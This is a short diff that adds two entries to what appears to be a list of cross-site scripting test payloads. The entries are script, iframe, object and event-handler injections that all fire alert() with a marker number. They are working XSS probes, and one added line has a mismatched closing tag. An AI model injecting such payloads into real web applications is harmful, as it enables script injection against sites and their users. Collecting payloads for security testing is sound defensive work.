@@ -17,6 +17,8 @@
 <a href=javascript:alert(19628397001)>xsstest
 <iframe src=javascript:alert(19628397001)>
 <object data="data:text/html,<script>alert(19628397001)</script>"></object>
+<script src="data:text/javascript,alert(19628397001)"></object>
+</p><h1><u/onmouseover=alert(1)>19628397001
 ```
 
 
